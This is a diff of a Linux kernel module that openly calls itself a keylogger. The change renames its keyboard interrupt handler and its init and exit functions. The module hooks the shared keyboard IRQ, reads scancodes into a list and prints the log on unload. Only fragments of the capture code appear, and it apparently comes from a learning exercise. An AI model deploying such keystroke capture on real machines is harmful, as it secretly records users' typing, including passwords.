@@ -6,7 +6,7 @@ MODULE_LICENSE("GPL");
 
 extern t_key	*first;
 
-static irqreturn_t kbd2_isr(int irq, void *dev_id)
+static irqreturn_t	keyboard(int irq, void *dev_id)
 {
 	unsigned char	scancode;
 
@@ -19,25 +19,25 @@ static irqreturn_t kbd2_isr(int irq, void *dev_id)
 	return IRQ_HANDLED;
 }
 
-static int __init kbd2_init(void)
+static int __init	keyboard_init(void)
 {
 	pr_info("Keylogger ON\n");
 
 	create_misc();
 
-	return request_irq(KBD_IRQ, kbd2_isr, IRQF_SHARED, "kbd2", (void *)kbd2_isr);
+	return request_irq(KBD_IRQ, keyboard, IRQF_SHARED, "key_logger", (void *)keyboard);
 }
 
-static void __exit kbd2_exit(void)
+static void __exit	keyboard_exit(void)
 {
 	print_log();
 
 	// free and destroy
 	free_lst();
-	free_irq(KBD_IRQ, (void *)kbd2_isr);
+	free_irq(KBD_IRQ, (void *)keyboard);
 	destroy_misc();
 	pr_info("Keylogger OFF\n");
 }
 
-module_init(kbd2_init);
-module_exit(kbd2_exit);
+module_init(keyboard_init);
+module_exit(keyboard_exit);
